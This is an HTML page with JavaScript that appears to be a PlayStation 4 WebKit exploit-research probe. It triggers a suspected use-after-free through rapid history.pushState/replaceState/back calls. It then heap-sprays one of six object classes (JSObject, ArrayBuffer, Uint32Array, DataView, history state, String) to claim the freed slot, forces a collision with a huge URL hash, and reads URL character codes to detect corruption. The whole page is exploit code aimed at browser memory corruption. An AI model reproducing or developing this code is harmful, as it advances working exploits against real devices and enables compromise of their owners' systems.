<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Slot Class Matrix</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:14px; margin:6px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h3>UAF Slot Fixation – Class Matrix</h3>

<button onclick="run('jsobject')">JSObject (~32B)</button>
<button onclick="run('arraybuffer')">ArrayBuffer Header</button>
<button onclick="run('uint32')">Uint32Array Header</button>
<button onclick="run('dataview')">DataView Header</button>
<button onclick="run('historystate')">History State Object</button>
<button onclick="run('stringobject')">new String()</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
const sleep = ms => new Promise(r=>setTimeout(r,ms));

async function uafTrigger(){
    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);

        history.pushState({i}, "", "#"+frag);
        history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log("[ITER "+i+"] back() async");
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

function sprayClass(kind){
    let arr = [];

    switch(kind){
        case "jsobject":
            for(let i=0;i<8000;i++)
                arr.push({a:1,b:2});
            break;

        case "arraybuffer":
            for(let i=0;i<6000;i++)
                arr.push(new ArrayBuffer(8));
            break;

        case "uint32":
            for(let i=0;i<6000;i++)
                arr.push(new Uint32Array(1));
            break;

        case "dataview":
            for(let i=0;i<6000;i++)
                arr.push(new DataView(new ArrayBuffer(8)));
            break;

        case "historystate":
            for(let i=0;i<6000;i++)
                history.replaceState({k:i}, "", "#S"+i);
            break;

        case "stringobject":
            for(let i=0;i<8000;i++)
                arr.push(new String("X"));
            break;
    }

    return arr;
}

async function run(kind){
    logEl.textContent = "";

    log("=== BASELINE ===");
    log("URL.length = " + document.URL.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    await uafTrigger();

    log("=== SLOT FIXATION ("+kind+") ===");
    let keep = sprayClass(kind);
    log("Spray done");

    await sleep(20);

    log("=== CONTROL COLLISION ===");
    history.replaceState({ctrl:"A"}, "", "#X");
    history.replaceState({ctrl:"B"}, "", "#"+("B".repeat(700000)));
    history.back();

    await sleep(60);

    log("=== POST ===");
    log("URL.length = " + document.URL.length);
    log("hash.length = " + location.hash.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    log("=== CHARCODE PROBE ===");
    log("64 = " + document.URL.charCodeAt(64));
    log("128 = " + document.URL.charCodeAt(128));
    log("256 = " + document.URL.charCodeAt(256));

    log("=== END TEST ===");
}
</script>

</body>
</html>
